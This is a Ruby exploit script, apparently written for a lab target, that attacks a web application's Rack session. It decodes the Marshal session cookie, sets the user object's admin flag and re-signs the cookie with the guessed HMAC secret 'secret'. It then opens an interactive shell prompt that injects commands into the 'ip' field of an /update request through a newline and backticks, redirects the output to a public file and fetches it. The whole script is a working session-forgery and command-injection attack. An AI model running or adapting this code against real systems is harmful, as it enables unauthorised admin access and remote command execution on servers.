class User
	attr_accessor :admin
end

require "openssl"
require "data_mapper"
require "net/http"
require "uri"
require "pp"
require "base64"

DataMapper.setup(:default, 'sqlite3::memory')

# Reote host
URL = "http://192.168.88.193/login"

# Create URL
url = URI.parse(URL)

# Proxy config
PROXY = "127.0.0.1"
PROXY_PORT = "8080"

creds = "test"

# Auth
resp = Net::HTTP::Proxy(PROXY, PROXY_PORT).start(url.host, url.port) do |http|
	http.post(url.request_uri, "login=#{creds}&password=#{creds}")
end

# Get the cookie
c = resp.header['Set-Cookie'].split("=")[1].split("; ")[0]
cookie, signature = c.split("--")
decoded = Base64.decode64(URI.decode(cookie))
begin
	# Load object
	object = Marshal.load(decoded)

	# Modify the object
	object["user"].admin = true

	# new cookie
	nc = Base64.encode64(Marshal.dump(object))
	ns = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, "secret", nc)

	# URI.encode doesn't encode eq sign
	newCookie = URI.encode(nc).gsub("=", "%3D") + "--" + ns
rescue ArgumentError => e
	puts "ERROR: " + e.to_s
end

# Go go go
#resp = Net::HTTP::Proxy(PROXY, PROXY_PORT).start(url.host, url.port) do |http|
#	http.get("/", {"Cookie" => "rack.session="+newCookie })
#end
#pp resp
#pp resp.body

while 1
	print "cmd> "
	cmd = STDIN.readline
	cmd.chomp!
	# HTTP req
	post = "id=1&name=webmail&ttl=600&ip=192.168.3.10%0a"
	post += "`#{URI.encode(cmd)}+>+/var/www/public/result.txt`"
	resp = Net::HTTP::Proxy(PROXY, PROXY_PORT).start(url.host, url.port) do |http|
		http.post("/update", post, {"Cookie" => "rack.session="+newCookie} )
	end
	if resp.header['Location'] =~ /login/
		puts "You have been logged out"
		exit
	elsif resp.body =~ /Invalid data provided/
		puts "Error processing the command"
	else
		resp = Net::HTTP::Proxy(PROXY, PROXY_PORT).start(url.host, url.port) do |http|
			http.get("/result.txt", )
		end
		puts resp.body
	end
end

